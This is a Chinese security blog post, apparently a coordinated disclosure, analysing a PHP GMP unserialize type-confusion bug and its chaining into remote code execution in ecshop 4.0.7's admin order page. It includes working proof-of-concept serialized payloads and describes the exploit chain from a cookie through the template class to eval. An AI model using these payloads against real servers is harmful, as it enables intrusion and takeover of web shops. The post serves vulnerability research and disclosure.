---
title: 从反序列化到类型混淆漏洞 -- 记一次ecshop实例利用
date: 2020-07-08 11:58:22
tags:
- 反序列化漏洞 
- 类型混淆漏洞 
- ecshop
---

本文初完成于2020年3月31日，由于涉及到0day利用，所以于2020年3月31日报告厂商、CNVD漏洞平台，满足90天漏洞披露期，遂公开。

--------------------------------------------------------------------------------------

前几天偶然看到了一篇在hackone上提交得漏洞报告，在这个漏洞中，漏洞发现者提出了很有趣的利用，作者利用GMP的一个类型混淆漏洞，配合相应的利用链可以构造mybb的一次代码执行，这里我们就一起来看看这个漏洞。

[https://hackerone.com/reports/198734](https://hackerone.com/reports/198734)

以下文章部分细节，感谢漏洞发现者@taoguangchen的帮助.

<!--more-->

# GMP类型混淆漏洞

- [https://bugs.php.net/bug.php?id=70513](https://bugs.php.net/bug.php?id=70513)

## 漏洞利用条件

- php 5.6.x
- 反序列化入口点
- 可以触发__wakeup的触发点（在php < 5.6.11以下，可以使用内置类）

## 漏洞详情

gmp.c
```
static int gmp_unserialize(zval **object, zend_class_entry *ce, const unsigned char *buf, zend_uint buf_len, zend_unserialize_data *data TSRMLS_DC) /* {{{ */
{
	...
	ALLOC_INIT_ZVAL(zv_ptr);
	if (!php_var_unserialize(&zv_ptr, &p, max, &unserialize_data TSRMLS_CC)
		|| Z_TYPE_P(zv_ptr) != IS_ARRAY
	) {
		zend_throw_exception(NULL, "Could not unserialize properties", 0 TSRMLS_CC);
		goto exit;
	}

	if (zend_hash_num_elements(Z_ARRVAL_P(zv_ptr)) != 0) {
		zend_hash_copy(
			zend_std_get_properties(*object TSRMLS_CC), Z_ARRVAL_P(zv_ptr),
			(copy_ctor_func_t) zval_add_ref, NULL, sizeof(zval *)
		);
	}
```

`zend_object_handlers.c`
```
ZEND_API HashTable *zend_std_get_properties(zval *object TSRMLS_DC) /* {{{ */
{
	zend_object *zobj;
	zobj = Z_OBJ_P(object);
	if (!zobj->properties) {
		rebuild_object_properties(zobj);
	}
	return zobj->properties;
}
```

从gmp.c中的片段中我们可以大致理解漏洞发现者taoguangchen的原话。

`__wakeup`等魔术方法可以导致ZVAL在内存中被修改。因此，攻击者可以将**object转化为整数型或者bool型的ZVAL，那么我们就可以通过`Z_OBJ_P`访问存储在对象储存中的任何对象，这也就意味着可以通过`zend_hash_copy`覆盖任何对象中的属性，这可能导致很多问题，在一定场景下也可以导致安全问题。

或许仅凭借代码片段没办法理解上述的话，但我们可以用实际测试来看看。

首先我们来看一段测试代码

```
<?php

class obj
{
    var $ryat;

    function __wakeup()
    {
        $this->ryat = 1;
    }
}

class b{
	var $ryat =1;
}

$obj = new stdClass;
$obj->aa = 1;
$obj->bb = 2;

$obj2 = new b;

$obj3 = new stdClass;
$obj3->aa =2;


$inner = 's:1:"1";a:3:{s:2:"aa";s:2:"hi";s:2:"bb";s:2:"hi";i:0;O:3:"obj":1:{s:4:"ryat";R:2;}}';
$exploit = 'a:1:{i:0;C:3:"GMP":'.strlen($inner).':{'.$inner.'}}';
$x = unserialize($exploit);

$obj4 = new stdClass;

var_dump($x);
var_dump($obj);
var_dump($obj2);	
var_dump($obj3);
var_dump($obj4);

?>
```

在代码中我展示了多种不同情况下的环境。

让我们来看看结果是什么？

```
array(1) {
  [0]=>
  &int(1)
}
object(stdClass)#1 (3) {
  ["aa"]=>
  string(2) "hi"
  ["bb"]=>
  string(2) "hi"
  [0]=>
  object(obj)#5 (1) {
    ["ryat"]=>
    &int(1)
  }
}
object(b)#2 (1) {
  ["ryat"]=>
  int(1)
}
object(stdClass)#3 (1) {
  ["aa"]=>
  int(2)
}
object(stdClass)#4 (0) {
}

```

我成功修改了第一个声明的对象。

但如果我将反序列化的类改成b会发生什么呢？
```
$inner = 's:1:"1";a:3:{s:2:"aa";s:2:"hi";s:2:"bb";s:2:"hi";i:0;O:1:"b":1:{s:4:"ryat";R:2;}}';
```

很显然的是，并不会影响到其他的类变量

```
array(1) {
  [0]=>
  &object(GMP)#4 (4) {
    ["aa"]=>
    string(2) "hi"
    ["bb"]=>
    string(2) "hi"
    [0]=>
    object(b)#5 (1) {
      ["ryat"]=>
      &object(GMP)#4 (4) {
        ["aa"]=>
        string(2) "hi"
        ["bb"]=>
        string(2) "hi"
        [0]=>
        *RECURSION*
        ["num"]=>
        string(2) "32"
      }
    }
    ["num"]=>
    string(2) "32"
  }
}
object(stdClass)#1 (2) {
  ["aa"]=>
  int(1)
  ["bb"]=>
  int(2)
}
object(b)#2 (1) {
  ["ryat"]=>
  int(1)
}
object(stdClass)#3 (1) {
  ["aa"]=>
  int(2)
}
object(stdClass)#6 (0) {
}

```

如果我们给class b加一个`__Wakeup`函数，那么又会产生一样的效果。

但如果我们把wakeup魔术方法中的变量设置为2

```

class obj
{
    var $ryat;

    function __wakeup()
    {
        $this->ryat = 2;
    }
}
```

返回的结果可以看出来，我们成功修改了第二个声明的对象。

```
array(1) {
  [0]=>
  &int(2)
}
object(stdClass)#1 (2) {
  ["aa"]=>
  int(1)
  ["bb"]=>
  int(2)
}
object(b)#2 (4) {
  ["ryat"]=>
  int(1)
  ["aa"]=>
  string(2) "hi"
  ["bb"]=>
  string(2) "hi"
  [0]=>
  object(obj)#5 (1) {
    ["ryat"]=>
    &int(2)
  }
}
object(stdClass)#3 (1) {
  ["aa"]=>
  int(2)
}
object(stdClass)#4 (0) {
}
```

但如果我们把ryat改为4，那么页面会直接返回500，因为我们修改了没有分配的对象空间。

在完成前面的试验后，我们可以把漏洞的利用条件简化一下。

如果我们有一个可控的**反序列化入口**，目标**后端PHP安装了GMP插件**（这个插件在原版php中不是默认安装的，但部分打包环境中会自带），如果我们找到一个**可控的`__wakeup`魔术方法**，我们就可以修改反序列化前声明的对象属性，并配合场景产生实际的安全问题。

如果目标的php版本在5.6 <= 5.6.11中，我们可以直接使用内置的魔术方法来触发这个漏洞。

```
var_dump(unserialize('a:2:{i:0;C:3:"GMP":17:{s:4:"1234";a:0:{}}i:1;O:12:"DateInterval":1:{s:1:"y";R:2;}}'));
```

# 真实世界案例

在讨论完GMP类型混淆漏洞之后，我们必须要讨论一下这个漏洞在真实场景下的利用方式。

漏洞的发现者Taoguang Chen提交了一个在mybb中的相关利用。

[https://hackerone.com/reports/198734](https://hackerone.com/reports/198734)

这里我们不继续讨论这个漏洞，而是从头讨论一下在ecshop中的利用方式。

## 漏洞环境

- ecshop 4.0.7
- php 5.6.9

## 反序列化漏洞

首先我们需要找到一个反序列化入口点，这里我们可以全局搜索`unserialize`，挨个看一下我们可以找到两个可控的反序列化入口。

其中一个是search.php line 45
```
...
{
    $string = base64_decode(trim($_GET['encode']));

    if ($string !== false)
    {
        $string = unserialize($string);
        if ($string !== false)
...
```

这是一个前台的入口，但可惜的是引入初始化文件在反序列化之后，这也就导致我们没办法找到可以覆盖类变量属性的目标，也就没办法进一步利用。

还有一个是admin/order.php line 229

```
    /* 取得上一个、下一个订单号 */
    if (!empty($_COOKIE['ECSCP']['lastfilter']))
    {
        $filter = unserialize(urldecode($_COOKIE['ECSCP']['lastfilter']));

       ...
```

后台的表单页的这个功能就满足我们的要求了，不但可控，还可以用urlencode来绕过ecshop对全局变量的过滤。

这样一来我们就找到了一个可控并且合适的反序列化入口点。

## 寻找合适的类属性利用链

在寻找利用链之前，我们可以用
```
get_declared_classes()
```
来确定在反序列化时，已经声明定义过的类。

在我本地环境下，除了PHP内置类以外我一共找到13个类
```
  [129]=>
  string(3) "ECS"
  [130]=>
  string(9) "ecs_error"
  [131]=>
  string(8) "exchange"
  [132]=>
  string(9) "cls_mysql"
  [133]=>
  string(11) "cls_session"
  [134]=>
  string(12) "cls_template"
  [135]=>
  string(11) "certificate"
  [136]=>
  string(6) "oauth2"
  [137]=>
  string(15) "oauth2_response"
  [138]=>
  string(14) "oauth2_request"
  [139]=>
  string(9) "transport"
  [140]=>
  string(6) "matrix"
  [141]=>
  string(16) "leancloud_client"
```

从代码中也可以看到在文件头引入了多个库文件

```
require(dirname(__FILE__) . '/includes/init.php');
require_once(ROOT_PATH . 'includes/lib_order.php');
require_once(ROOT_PATH . 'includes/lib_goods.php');
require_once(ROOT_PATH . 'includes/cls_matrix.php');
include_once(ROOT_PATH . 'includes/cls_certificate.php');
require('leancloud_push.php');
```

这里我们主要关注init.php，因为在这个文件中声明了ecshop的大部分通用类。

在逐个看这里面的类变量时，我们可以敏锐的看到一个特殊的变量，由于ecshop的后台结构特殊，页面内容大多都是由模板编译而成，而这个模板类恰好也在init.php中声明

```
require(ROOT_PATH . 'includes/cls_template.php');
$smarty = new cls_template;
```

回到order.php中我们寻找与`$smarty`相关的方法，不难发现，主要集中在两个方法中

```
...
    $smarty->assign('shipping', $shipping);

    $smarty->display('print.htm');
...
```

而这里我们主要把视角集中在display方法上。

粗略的浏览下display方法的逻辑大致是

```
请求相应的模板文件
-->
经过一系列判断，将相应的模板文件做相应的编译
-->
输出编译后的文件地址
```

比较重要的代码会在`make_compiled`这个函数中被定义

```
function make_compiled($filename)
    {
        $name = $this->compile_dir . '/' . basename($filename) . '.php';
        
        ...

        if ($this->force_compile || $filestat['mtime'] > $expires)
        {
            $this->_current_file = $filename;
            $source = $this->fetch_str(file_get_contents($filename));

            if (file_put_contents($name, $source, LOCK_EX) === false)
            {
                trigger_error('can\'t write:' . $name);
            }

            $source = $this->_eval($source);
        }

        return $source;
    }
```

当流程走到这一步的时候，我们需要先找到我们的目标是什么？

重新审视`cls_template.php`的代码，我们可以发现涉及到代码执行的只有几个函数。

```
   function get_para($val, $type = 1) // 处理insert外部函数/需要include运行的函数的调用数据
    {
        $pa = $this->str_trim($val);
        foreach ($pa AS $value)
        {
            if (strrpos($value, '='))
            {
                list($a, $b) = explode('=', str_replace(array(' ', '"', "'", '&quot;'), '', $value));
                if ($b{0} == '$')
                {
                    if ($type)
                    {
                        eval('$para[\'' . $a . '\']=' . $this->get_val(substr($b, 1)) . ';');
                    }
                    else
                    {
                        $para[$a] = $this->get_val(substr($b, 1));
                    }
                }
                else
                {
                    $para[$a] = $b;
                }
            }
        }

        return $para;
    }
```

get_para只在select中调用，但是没找到能触发select的地方。

然后是pop_vars
```
    function pop_vars()
    {
        $key = array_pop($this->_temp_key);
        $val = array_pop($this->_temp_val);
     
        if (!empty($key))
        {
            eval($key);
        }
    }
```

恰好配合GMP我们可以控制`$this->_temp_key`变量，所以我们只要能在上面的流程中找到任意地方调用这个方法，我们就可以配合变量覆盖构造一个代码执行。

在回看刚才的代码流程时，我们从编译后的PHP文件中找到了这样的代码

order_info.htm.php
```
  <?php endforeach; endif; unset($_from); ?><?php $this->pop_vars();; ?>
```

在遍历完表单之后，正好会触发`pop_vars`。

这样一来，只要我们控制覆盖`cls_template`变量的`_temp_key`属性，我们就可以完成一次getshell

## 最终利用效果

![image.png-85.6kB][1]

# Timeline

- 2020.03.31 发现漏洞.
- 2020.03.31 将漏洞报送厂商、CVE、CNVD等.
- 2020.07.08 符合90天漏洞披露期，公开细节



  [1]: http://static.zybuluo.com/LoRexxar/v648p513stqqczwc4fxfo9k9/image.png